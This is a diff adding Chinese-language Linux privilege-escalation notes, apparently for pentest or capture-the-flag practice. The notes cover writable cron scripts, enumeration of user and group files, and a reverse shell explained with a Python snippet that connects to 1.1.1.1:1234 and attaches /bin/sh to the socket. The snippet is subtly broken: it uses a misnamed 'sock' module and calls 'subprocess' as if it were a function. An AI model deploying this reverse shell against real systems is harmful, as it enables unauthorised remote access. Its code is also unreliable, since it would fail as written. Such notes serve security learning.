@@ -64,4 +64,27 @@ find / -perm -4000 2>/dev/null
 
 * 查看/etc/crontab，查找定时任务
 
-查看其中不是root写权限的脚本，修改内容，执行
+查看其中不是root写权限的脚本或者指定的目录不存在，修改内容，执行
+
+* 查看/etc/passwd，查看所有用户
+
+* 查看 /etc/group，查看所有用户组
+
+* 查看 /tmp 目录，没准有有用信息
+
+* 反弹 shell
+  在攻击机使用netcat开启一个tcp服务器，在靶机使用一个tcp socket连接上攻击机，然后将输入输出全都重定向到这个socket，然后启动一个shell子进程。
+
+  代码大致如下：
+
+```python
+import os, subprocess, socket
+
+s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
+s.connect(("1.1.1.1", 1234))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p=subprocess(["/bin/sh", "-l"])
+```
+
